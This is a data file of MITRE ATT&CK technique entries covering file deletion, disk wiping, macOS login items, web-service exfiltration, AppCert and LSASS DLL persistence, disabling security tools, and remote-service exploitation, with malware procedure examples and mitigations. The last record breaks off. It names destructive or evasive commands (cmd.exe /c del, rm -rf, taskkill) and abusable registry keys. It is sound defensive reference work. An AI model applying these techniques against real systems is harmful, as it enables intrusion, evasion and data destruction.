{"text": " Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint. There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native [cmd](https://attack.mitre.org/software/S0106) functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. (Citation: Trend Micro APT Attack Tools)", "idx": "https://attack.mitre.org/techniques/T1070/004", "title": "File Deletion", "entity": "File Deletion", "entity_type": "techniques", "entity_context": ["Some Sakula samples use cmd.exe to delete temporary files.", "TEMP.Veles routinely deleted tools, logs, and other files after they were finished with them.", "XAgentOSX contains the deletFileFromPath function to delete a specified file using the NSFileManager:removeFileAtPath method.", "BabyShark has cleaned up all files associated with the secondary payload execution.", "OSX_OCEANLOTUS.D has a command to delete a file from the system. OSX_OCEANLOTUS.D deletes the app bundle and dropper after execution.", "Cryptoistic has the ability delete files from a compromised host.", "Pay2Key can remove its log file from disk.", "Metamorfo has deleted itself from the system after execution.", "Rocke has deleted files on infected machines.\t", "KEYMARBLE has the capability to delete files off the victim’s machine.", "Kazuar can delete files.", "Hydraq creates a backdoor through which remote attackers can delete files.", "Lokibot will delete its dropped files after bypassing UAC.", "Proton removes all files in the /tmp directory.", "FIN10 has used batch scripts and scheduled tasks to delete critical system files.", "FruitFly will delete files on the system.", "Bazar can delete its loader using a batch file in the Windows temporary folder.", "Recent versions of Cherry Picker delete files and registry keys created by the malware.", "Proxysvc can delete files indicated by the attacker and remove itself from disk using a batch file.", "ROKRAT can request to delete files.\t", "KONNI can delete files.", "WINDSHIELD is capable of file deletion along with other file system interaction.", "HAWKBALL has the ability to delete files.\t", "RTM can delete all files created during its execution.", "QUADAGENT has a command to delete its Registry key and scheduled task.", "RunningRAT contains code to delete files from the victim’s machine.", "USBStealer has several commands to delete files associated with the malware from the victim.", "GoldenSpy's uninstaller can delete registry entries, files and folders, and finally itself once these tasks have been completed.", "HALFBAKED can delete a specified file.", "TYPEFRAME can delete files off the system.", "AuditCred can delete files from the system.", "REvil can mark its binary code for deletion after reboot.", "Pony has used scripts to delete itself after execution.\t", "APT18 actors deleted tools and batch files from victim systems.", "Crimson has the ability to delete files from a compromised host.\t ", "BackConfig has the ability to remove files and folders related to previous infections.", "TAINTEDSCRIBE can delete files from a compromised host.", "AppleJeus has deleted the MSI file after installation.", "Taidoor can use <code>DeleteFileA</code> to remove files from infected hosts.", "The BRONZE BUTLER uploader or malware the uploader uses <code>command</code> to delete the RAR archives after they have been exfiltrated.", "CSPY Downloader has the ability to self delete.", "APT41 deleted files from the system. ", "jRAT has a function to delete files from the victim’s machine.", "POWERSTATS can delete all files on the C:\\, D:\\, E:\\ and, F:\\ drives using PowerShell Remove-Item commands.", "Pysa has deleted batch files after execution.  ", "SUNBURST had a command to delete files.", "Once a file is uploaded, Machete will delete it from the machine. ", "FatDuke can secure delete its DLL.", "OceanSalt can delete files from the system.", "APT3 has a tool that can delete files.", "NanHaiShu launches a script to delete their original decoy file to cover tracks.", "Derusbi is capable of deleting files. It has been observed loading a Linux Kernel Module (LKM) and then deleting it from the hard disk as well as overwriting the data with null bytes.", "TDTESS creates then deletes log files during installation of itself as a service.", "Patchwork removed certain files and replaced them so they could not be retrieved.", "Imminent Monitor has deleted files related to its dynamic debugger feature.", "APT28 has intentionally deleted computer files to cover their tracks, including with use of the program CCleaner.", "Cobalt Group deleted the DLL dropper from the victim’s machine to cover their tracks.", "Dragonfly 2.0 deleted many of its files used during operations as part of cleanup, including removing applications and deleting screenshots.", "APT32's macOS backdoor can receive a “delete” command.", "SLOTHFULMEDIA has deleted itself and the 'index.dat' file on a compromised machine to remove recent Internet history from the system.", "HTTPBrowser deletes its original installer file once installation is complete.", "TeamTNT uses a payload that removes itself after running.", "VERMIN can delete files on the victim’s machine.", "SDBbot has the ability to delete files from a compromised host.", "Sibot will delete itself if a certain server response is received.", "Honeybee removes batch files to reduce fingerprint on the system as well as deletes the CAB file that gets encoded upon infection.", "MacSpy deletes any temporary files it creates", "Tropic Trooper has deleted dropper files on an infected system using command scripts.\t", "gh0st RAT has the capability to to delete files.", "Stuxnet uses an RPC server that contains a routine for file deletion.", "Remsec is capable of deleting files on the victim. It also securely removes itself after collecting and exfiltrating data.", "Lazarus Group malware deletes files in various ways, including \"suicide scripts\" to delete malware binaries from the victim. Lazarus Group also uses secure file deletion to delete files from the victim.", "PLEAD has the ability to delete files on the compromised host.", "Linfo creates a backdoor through which remote attackers can delete files.", "Following the successful injection of SUNBURST, SUNSPOT deleted a temporary file it created named <code>InventoryManager.bk</code> after restoring the original SolarWinds Orion source code to the software library.", "Malware used by Group5 is capable of remotely deleting files from victims.", "PowerShower has the ability to remove all files created during the dropper process.", "Fysbis has the ability to delete files.", "SamSam has been seen deleting its own files and payloads to make analysis of the attack more difficult.", "Gamaredon Group tools can delete files used during an infection.", "FIN6 has removed files from victim machines.", "Drovorub can delete specific files from a compromised host.", "Reaver deletes the original dropped file from the victim.", "Mustang Panda will delete their tools and files, and kill processes after their objectives are reached.", "SpeakUp deletes files to remove evidence on the machine. ", "StoneDrill has been observed deleting the temporary files once they fulfill their task.\t", "BLUELIGHT can uninstall itself.", " SombRAT has the ability to run <code>cancel</code> or <code>closeanddeletestorage</code> to remove all files from storage and delete the storage temp file on a compromised host.", "ECCENTRICBANDWAGON can delete log files generated from the malware stored at <code>C:\\windows\\temp\\tmp0207</code>.", "Operation Wocao has deleted logs and executable files used during an intrusion.", "Exaramel for Linux can uninstall its persistence mechanism and delete its configuration file.", "Zebrocy has a command to delete files and directories.", "Magic Hound has deleted and overwrote files to cover tracks.", "QakBot can delete folders and files including overwriting its executable with legitimate programs.", "Aria-body has the ability to delete files and directories on compromised hosts.", "EvilBunny has deleted the initial dropper after running through the environment checks.", "PowerDuke has a command to write random data across a file and delete it.", "DustySky can delete files it creates from the infected system.", "Epic has a command to delete a file from the machine.", "BBSRAT can delete files and directories.", "Sandworm Team has used backdoors that can delete files used in an attack from an infected system.", "ZxShell can delete files from the system. ", "InvisiMole has deleted files and directories including XML and files successfully uploaded to C2 servers.", "CARROTBAT has the ability to delete downloaded files from a compromised host.", "AppleSeed can delete files from a compromised host after they are exfiltrated.", "Kivars has the ability to uninstall malware from the infected host.", "Nebulae has the ability to delete files and directories.", "OilRig has deleted files associated with their payload after execution.", "The JHUHUGIT dropper can delete itself from the victim. Another JHUHUGIT variant has the capability to delete specified files.", "Grandoreiro can delete .LNK files created in the Startup folder.", "Trojan.Karagany has used plugins with a self-delete capability.", "Silence has deleted artifacts, including scheduled tasks, communicates files from the C2 and other logs.\t", "More_eggs can remove itself from a system.", "JPIN's installer/uninstaller component deletes itself if it encounters a version of Windows earlier than Windows XP or identifies security-related processes running.", "Zeus Panda has a command to delete a file. It also can uninstall scripts and delete files to cover its track.", "NOKKI can delete files to cover tracks.", "GuLoader can delete its executable from the <code>AppData\\Local\\Temp</code> directory on the compromised host.", "GreyEnergy can securely delete a file by hooking into the DeleteFileA and DeleteFileW functions in the Windows API.", "LightNeuron has a function to delete files.", "LoudMiner deleted installation files after completion.", "Hi-Zor deletes its RAT installer file as it executes its DLL payload file.", "A menuPass macro deletes files after it has decoded and decompressed them.", "Wingbird deletes its payload along with the payload's parent process after it finishes copying files.", "Rising Sun can delete files specified by the C2.\t", "APT38 has used a utility called CLOSESHAVE that can securely delete a file from the system. They have also removed malware, tools, or other non-native files used during the intrusion to reduce their footprint or as part of the post-intrusion cleanup process.", "Pteranodon can delete files that may interfere with it executing. It also can delete temporary files and itself after the initial script executes.", "pngdowner deletes content from C2 communications that was saved to the user's temporary directory.", "Hancitor has deleted files using the VBA <code>kill</code> function.", "MoonWind can delete itself or specified files.", "StrongPity can delete previously exfiltrated files from the compromised host.", "Cuba can use the command <code>cmd.exe /c del</code> to delete its artifacts from the system. ", "Anchor can self delete its dropper after the malware is successfully deployed.", "The White Company has the ability to delete its malware entirely from the target system.", "FELIXROOT deletes the .LNK file from the startup directory as well as the dropper components.", "ADVSTORESHELL can delete files and directories.", "Hildegard has deleted scripts after execution. ", "P.A.S. Webshell can delete scripts from a subdirectory of /tmp after they are run.", "Wizard Spider has used file deletion to remove some modules and configurations from an infected host after use.", "Ixeshe has a command to delete a file from the machine.", "FIN8 has deleted tmp and prefetch files during post compromise cleanup activities.", "Carbanak has a command to delete files.", "RedLeaves can delete specified files.", "Backdoor.Oldrea contains a cleanup module that removes traces of itself from the victim.", "WindTail has the ability to receive and execute a self-delete command.", "VBShower has attempted to complicate forensic analysis by deleting all the files contained in <code>%APPDATA%\\..\\Local\\Temporary Internet Files\\Content.Word</code> and <code>%APPDATA%\\..\\Local Settings\\Temporary Internet Files\\Content.Word\\</code>.", "OopsIE has the capability to delete files and scripts from the victim's machine.", "Okrum's backdoor deletes files after they have been successfully uploaded to C2 servers.", "zwShell has deleted itself after creating a service as well as deleted a temporary file when the system reboots.", "Attor’s plugin deletes the collected files and log files after exfiltration.", "MURKYTOP has the capability to delete local files.", "InnaputRAT has a command to delete files.", "Pillowmint has deleted the filepath <code>%APPDATA%\\Intel\\devmonsrv.exe</code>.", "RDFSNIFFER has the capability of deleting local files.", "Once loaded into memory, MESSAGETAP deletes the keyword_parm.txt and parm.txt configuration files from disk. ", "Dtrack can remove its persistence and delete itself.", "SeaDuke can securely delete files, including deleting itself from the victim.", "HotCroissant has the ability to clean up installed files, delete files, and delete itself from the victim’s machine.", "ProLock can remove files containing its payload after they are executed.", "Kimsuky has deleted the exfiltrated data on disk after transmission.", "Misdat is capable of deleting the backdoor file.", "RainyDay has the ability to uninstall itself by deleting its service and files.", "Bandook has a command to delete a file.", "Azorult can delete files from victim machines.", "PUNCHBUGGY can delete files written to disk.", "Chimera has performed file deletion to evade detection. ", "BLINDINGCAN has deleted itself and associated artifacts from victim machines.", "Bankshot marks files to be deleted upon the next system reboot and uninstalls and removes itself from the system.", "Penquin can delete downloaded executables after running them.", "Gold Dragon deletes one of its files, 2.hwp, from the endpoint after establishing persistence.", "Elise is capable of launching a remote shell on the host to delete itself.", "APT29 routinely removed their tools, including custom backdoors, once remote access was achieved. APT29 has also used SDelete to remove artifacts from victims.", "ShimRat can uninstall itself from compromised hosts, as well create and modify directories, delete, move, copy, and rename files.", "Calisto has the capability to use <code>rm -rf</code> to remove folders and files from the victim's machine.", "FALLCHILL can delete malware and associated artifacts from the victim.", "LockerGoga has been observed deleting its original launcher after execution.", "Mosquito deletes files using DeleteFileW API call.", "HyperBro has the ability to delete a specified file.", "The Komplex trojan supports file deletion.", "LookBack removes itself after execution and can delete files on the system.", "cmd can be used to delete files from the file system.", "ServHelper has a module to delete itself from the infected machine.", "Ursnif has deleted data staged in tmp files after exfiltration.", "Bisonal deletes its dropper and VBS scripts from the victim’s machine.", "Threat Group-3390 has deleted existing logs and exfiltrated file archives from a victim.", "Denis has a command to delete files from the victim’s machine.", "LiteDuke can securely delete files by first writing random data to the file.", "BLACKCOFFEE has the capability to delete files.", "Seasalt has a command to delete a specified file.", "SDelete deletes data in a way that makes it unrecoverable.", "Evilnum has deleted files used during infection.", "Volgmer can delete files and itself after infection to avoid analysis.", "RDAT can issue SOAP requests to delete already processed C2 emails. RDAT can also delete itself from the infected system.\t", "Gazer has commands to delete files and persistence mechanisms from the victim.", "Cardinal RAT can uninstall itself, including deleting its executable.", "GrimAgent can delete old binaries on a compromised host.", "Pasam creates a backdoor through which remote attackers can delete files.", "APT39 has used malware to delete files after they are deployed on a compromised host.", "FIN5 uses SDelete to clean up the environment and attempt to prevent detection.", "SQLRat has used been observed deleting scripts once used.\t"], "is_subtechnique": true}
{"text": " Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted. To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)", "idx": "https://attack.mitre.org/techniques/T1561", "title": "Disk Wipe", "entity": "Disk Wipe", "entity_type": "techniques", "entity_context": ["Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery."], "is_subtechnique": false}
{"text": " Adversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in.(Citation: Open Login Items Apple) Login items can be added via a shared file list or Service Management Framework.(Citation: Adding Login Items) Shared file list login items can be set using scripting languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002), whereas the Service Management Framework uses the API call <code>SMLoginItemSetEnabled</code>. Login items installed using the Service Management Framework leverage <code>launchd</code>, are not visible in the System Preferences, and can only be removed by the application that created them.(Citation: Adding Login Items)(Citation: SMLoginItemSetEnabled Schroeder 2013) Login items created using a shared file list are visible in System Preferences, can hide the application when it launches, and are executed through LaunchServices, not launchd, to open applications, documents, or URLs without using Finder.(Citation: Launch Services Apple Developer) Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications. Adversaries can utilize [AppleScript](https://attack.mitre.org/techniques/T1059/002) and [Native API](https://attack.mitre.org/techniques/T1106) calls to create a login item to spawn malicious executables.(Citation: ELC Running at startup) Prior to version 10.5 on macOS, adversaries can add login items by using [AppleScript](https://attack.mitre.org/techniques/T1059/002) to send an Apple events to the “System Events” process, which has an AppleScript dictionary for manipulating login items.(Citation: Login Items AE) Adversaries can use a command such as <code>tell application “System Events” to make login item at end with properties", "idx": "https://attack.mitre.org/techniques/T1547/015", "title": "Login Items", "entity": "Login Items", "entity_type": "techniques", "entity_context": ["NETWIRE can persist via startup options for Login items.", "Dok uses AppleScript to install a login Item by sending Apple events to the <code>System Events</code> process."], "is_subtechnique": true}
{"text": " Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services. Web service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.", "idx": "https://attack.mitre.org/techniques/T1567", "title": "Exfiltration Over Web Service", "entity": "Exfiltration Over Web Service", "entity_type": "techniques", "entity_context": ["DropBook has used legitimate web services to exfiltrate data.", "Ngrok has been used by threat actors to configure servers for data exfiltration.", "APT28 can exfiltrate data over Google Drive. ", "Web proxies can be used to enforce an external network communication policy that prevents use of unauthorized external services.", "Data loss prevention can be detect and block sensitive data being uploaded to web services via web browsers."], "is_subtechnique": false}
{"text": " Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppCertDLLs</code> Registry key under <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\</code> are loaded into every process that calls the ubiquitously used application programming interface (API) functions <code>CreateProcess</code>, <code>CreateProcessAsUser</code>, <code>CreateProcessWithLoginW</code>, <code>CreateProcessWithTokenW</code>, or <code>WinExec</code>. (Citation: Elastic Process Injection July 2017) Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity.", "idx": "https://attack.mitre.org/techniques/T1546/009", "title": "AppCert DLLs", "entity": "AppCert DLLs", "entity_type": "techniques", "entity_context": ["Honeybee's service-based DLL implant can execute a downloaded file with parameters specified using <code>CreateProcessAsUser</code>.", "PUNCHBUGGY can establish using a AppCertDLLs Registry key.", "Adversaries install new AppCertDLL binaries to execute this technique. Identify and block potentially malicious software executed through AppCertDLLs functionality by using application control  tools, like Windows Defender Application Control, AppLocker,   or Software Restriction Policies  where appropriate. "], "is_subtechnique": true}
{"text": " Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process. (Citation: Microsoft Security Subsystem) Adversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)), an adversary can use LSA operations to continuously execute malicious payloads.", "idx": "https://attack.mitre.org/techniques/T1547/008", "title": "LSASS Driver", "entity": "LSASS Driver", "entity_type": "techniques", "entity_context": ["On Windows 8.1 and Server 2012 R2, enable LSA Protection by setting the Registry key <code>HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\RunAsPPL</code> to <code>dword:00000001</code>.  LSA Protection ensures that LSA plug-ins and drivers are only loaded if they are digitally signed with a Microsoft signature and adhere to the Microsoft Security Development Lifecycle (SDL) process guidance. ", "On Windows 10 and Server 2016, enable Windows Defender Credential Guard  to run lsass.exe in an isolated virtualized environment without any device drivers. ", "Wingbird drops a malicious file (sspisrv.dll) alongside a copy of lsass.exe, which is used to register a service that loads sspisrv.dll as a driver. The payload of the malicious driver (located in its entry-point function) is executed when loaded by lsass.exe before the spoofed service becomes unstable and crashes.", "Ensure safe DLL search mode is enabled <code>HKEY_LOCAL_MACHINE\\\\System\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\SafeDllSearchMode</code> to mitigate risk that lsass.exe loads a malicious code library. ", "Pasam establishes by infecting the Security Accounts Manager (SAM) DLL to load a malicious DLL dropped to disk."], "is_subtechnique": true}
{"text": " Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take the many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls)", "idx": "https://attack.mitre.org/techniques/T1562/001", "title": "Disable or Modify Tools", "entity": "Disable or Modify Tools", "entity_type": "techniques", "entity_context": ["TrickBot can disable Windows Defender.", "ZxShell can kill AV products' processes. ", "Ensure proper Registry permissions are in place to prevent adversaries from disabling or interfering with security services.", "JPIN can lower security settings by changing Registry keys.", "POWERSTATS can disable Microsoft Office Protected View by changing Registry keys.", "LockerGoga installation has been immediately preceded by a \"task kill\" command in order to disable anti-virus.", "Avaddon looks for and attempts to stop anti-malware solutions.", "MegaCortex was used to kill endpoint security processes.", "SUNBURST attempted to disable software security services following checks against a FNV-1a + XOR hashed hardcoded blocklist.", "Babuk can stop anti-virus services on a compromised host.", "Gorgon Group malware can attempt to disable security features in Microsoft Office and Windows Defender using the <code>taskkill</code> command.", "Indrik Spider used PsExec to leverage Windows Defender to disable scanning of all downloaded files and to restrict real-time monitoring.", "Proton kills security tools like Wireshark that are running.", "TeamTNT has disabled and uninstalled security tools.", "Pysa has the capability to stop antivirus services and disable Windows Defender. ", "Clop can uninstall or disable security products.", "Turla has used a AMSI bypass, which patches the in-memory amsi.dll, in PowerShell scripts to bypass Windows antimalware products.", "MuddyWater can disable the system's local proxy settings.", "Kimsuky has been observed turning off Windows Security Center.", "Rocke used scripts which detected and uninstalled antivirus software.", "Goopy has the ability to disable Microsoft Outlook's security policies to disable macro warnings.\t", "Carberp has attempted to disable security software by creating a suspended process for the security software and injecting code to delete antivirus core files when the process is resumed.", "NanHaiShu can change Internet Explorer settings to reduce warnings about malware activity.", "Imminent Monitor has a feature to disable Windows Task Manager.\t", "QakBot has the ability to modify the Registry to add its binaries to the Windows Defender exclusion list.", "FIN6 has deployed a utility script named <code>kill.bat</code> to disable anti-virus.", "H1N1 kills and disables services for Windows Security Center, and Windows Defender.", "StrongPity can add directories used by the malware to the Windows Defender exclusions list to prevent detection.", "REvil can connect to and disable the Symantec server on the victim's network.", "Maze has disabled dynamic analysis and other security tools including IDA debugger, x32dbg, and OllyDbg. It has also disabled Windows Defender's Real-Time Monitoring feature and attempted to disable endpoint protection services.", "Ryuk has stopped services related to anti-virus.", "Ebury can disable SELinux Role-Based Access Control and deactivate PAM modules.", "HDoor kills anti-virus found on the victim.", "DarkComet can disable Security Center functions like anti-virus.", "Ragnar Locker has attempted to terminate/stop processes and services associated with endpoint security products.", "Bundlore can change browser security settings to enable extensions to be installed. Bundlore uses the <code>pkill cfprefsd</code> command to prevent users from inspecting processes.", "RunningRAT kills antimalware running process.", "APT29 used the service control manager on a remote system to disable services associated with security monitoring products.", "Metamorfo has a function to kill processes associated with defenses and can prevent certain processes from launching. ", "Hildegard has modified DNS resolvers to evade DNS monitoring tools.", "Agent Tesla has the capability to kill any running analysis processes and AV software.", "Wizard Spider has shut down or uninstalled security applications on victim systems that might prevent ransomware from executing.", "Egregor has disabled Windows Defender to evade protections.", "Gamaredon Group has delivered macros which can tamper with Microsoft Office security settings.\t", "Ensure proper process and file permissions are in place to prevent adversaries from disabling or interfering with security services.", "Grandoreiro can hook APIs, kill processes, break file system paths, and change ACLs to prevent security tools from running.", "RobbinHood will search for Windows services that are associated with antivirus software on the system and kill the process. ", "Unknown Logger has functionality to disable security tools, including Kaspersky, BitDefender, and MalwareBytes.", "NanoCore can modify the victim's anti-virus.", "Bazar has manually loaded ntdll from disk in order to identity and remove API hooks set by security products.\t", "Conficker terminates various services related to system security and Windows.", "Brave Prince terminates antimalware processes.", "ChChes can alter the victim's proxy configuration.", "EKANS stops processes related to security and management software.", "ThiefQuest uses the function <code>kill_unwanted</code> to obtain a list of running processes and kills each process matching a list of security related processes.", "Cobalt Strike has the ability to use Smart Applet attacks to disable the Java SecurityManager sandbox.", "BRONZE BUTLER has incorporated code into several tools that attempts to terminate anti-virus processes.", "Lazarus Group malware TangoDelta attempts to terminate various processes associated with McAfee. Additionally, Lazarus Group malware SHARPKNOT disables the Microsoft Windows System Event Notification and Alerter services.. ", "Netwalker can detect and terminate active security software-related processes on infected systems.", "Skidmap has the ability to set SELinux to permissive mode.", "SslMM identifies and kills anti-malware processes.", "Malware used by Putter Panda attempts to terminate processes corresponding to two components of Sophos Anti-Virus (SAVAdminService.exe and SavService.exe).", "Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services.", "TinyZBot can disable Avira anti-virus.", "Gold Dragon terminates anti-malware processes if they’re found running on the system.", "Night Dragon has disabled anti-virus and anti-spyware tools in some instances on the victim’s machines. The actors have also disabled proxy settings to allow direct communication from victims to the Internet."], "is_subtechnique": true}
{"text": " Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.(Citation: National Vulnerability Database) An adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005)) or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).", "idx": "https://attack.mitre.org/techniques/T1588/006", "title": "Vulnerabilities", "entity": "Vulnerabilities", "entity_type": "techniques", "entity_context": ["This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls.", "In 2017, Sandworm Team conducted technical research related to vulnerabilities associated with websites used by the Korean Sport and Olympic Committee, a Korean power company, and a Korean airport."], "is_subtechnique": true}
{"text": " Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system. An adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Scanning](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities, or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources. There are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services. (Citation: NVD CVE-2014-7169) Depending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.", "idx": "https://attack.mitre.org/techniques/T1210", "title": "Exploitation of Remote Services", "entity": "Exploitation of Remote Services", "entity_type": "techniques", "entity_context": ["InvisiMole can spread within a network via the BlueKeep (CVE-2019-0708) and EternalBlue (CVE-2017-0144) vulnerabilities in RDP and SMB respectively.", "Tonto Team has used EternalBlue exploits for lateral movement.", "Bad Rabbit used the EternalRomance SMB exploit to spread through victim networks.", "menuPass has used tools to exploit the ZeroLogon vulnerability (CVE-2020-1472).", "Conficker exploited the MS08-067 Windows vulnerability for remote code execution through a crafted RPC request.", "Threat Group-3390 has exploited MS17-010 to move laterally to other systems on the network.\t", "TrickBot utilizes EternalBlue and EternalRomance exploits for lateral movement in the modules wormwinDll, wormDll, mwormDll, nwormDll, tabDll.", "Minimize available services to only those that are necessary.", "Stuxnet propagates using the MS10-061 Print Spooler and MS08-067 Windows Server Service vulnerabilities.", "Wizard Spider has exploited or attempted to exploit Zerologon (CVE-2020-1472) and EternalBlue (MS17-010) vulnerabilities.", "Segment networks and systems appropriately to reduce access to critical systems and services to controlled methods.", "APT28 exploited a Windows SMB Remote Code Execution Vulnerability to conduct lateral movement.", "WannaCry uses an exploit in SMBv1 to spread itself to other remote systems on a network.", "Empire has a limited number of built-in modules for exploiting remote SMB, JBoss, and Jenkins servers.", "Develop a robust cyber threat intelligence capability to determine what types and levels of threat may use software exploits and 0-days against a particular organization.", "Security applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior.  Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring.  Many of these protections depend on the architecture and target application binary for compatibility and may not work for all software or services targeted.", "Make it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing. Other types of virtualization and application microsegmentation may also mitigate the impact of some types of exploitation. Risks of additional exploits and weaknesses in these systems may still exist. ", "NotPetya can use two exploits in SMBv1, EternalBlue and EternalRomance, to spread itself to other remote systems on the network.", "Fox Kitten has exploited known vulnerabilities in remote services including RDP.", "Update software regularly by employing patch management for internal enterprise endpoints and servers.", "Minimize permissions and access for service accounts to limit impact of exploitation.", "Emotet has been seen exploiting SMB via a vulnerability exploit like EternalBlue (MS17-010) to achieve lateral movement and propagation.  ", "QakBot can move laterally using worm-like functionality through exploitation of SMB.", "FIN7 has exploited ZeroLogon (CVE-2020-1472) against vulnerable domain controllers.", "Flame can use MS10-061 to exploit a print spooler vulnerability in a remote system with a shared printer in order to move laterally.", "Lucifer can exploit multiple vulnerabilities including EternalBlue (CVE-2017-0144) and EternalRomance (CVE-2017-0144).", "PoshC2 contains a module for exploiting SMB via EternalBlue.", "Regularly scan the internal network for available services to identify new and potentially vulnerable services."], "is_subtechnique": false}
{"text": " Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services) Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1546/008) technique for Persistence.(Citation: Alperovitch Malware)", "idx": "https://attack.mitre.org/techniques/T1021/001", "title": "Remote Desktop Protocol", "entity": "Remote Desktop Protocol", "entity_type": "techniques", "entity_context": ["Leviathan has targeted RDP credentials and used it to move through the victim environment. ", "Lazarus Group malware SierraCharlie uses RDP for propagation.", "Consider removing the local Administrators group from the list of groups allowed to log in through RDP.", "Limit remote user permissions if remote access is necessary.", "Blue Mockingbird has used Remote Desktop to log on to servers interactively and manually copy files to remote hosts.", "Kimsuky has used RDP for direct remote point-and-click access.", "DarkComet can open an active screen of the victim’s machine and take control of the mouse and keyboard.", "FIN10 has used RDP to move laterally to systems in the victim environment.", "ZxShell has remote desktop functionality. ", "OilRig has used Remote Desktop Protocol for lateral movement. The group has also used tunneling tools to tunnel RDP into the environment.", "Dragonfly 2.0 moved laterally via RDP.", "FIN6 used RDP to move laterally in victim networks.", "menuPass has used RDP connections to move across the victim network.", "ServHelper has commands for adding a remote desktop user and sending RDP traffic to the attacker through a reverse SSH tunnel.", 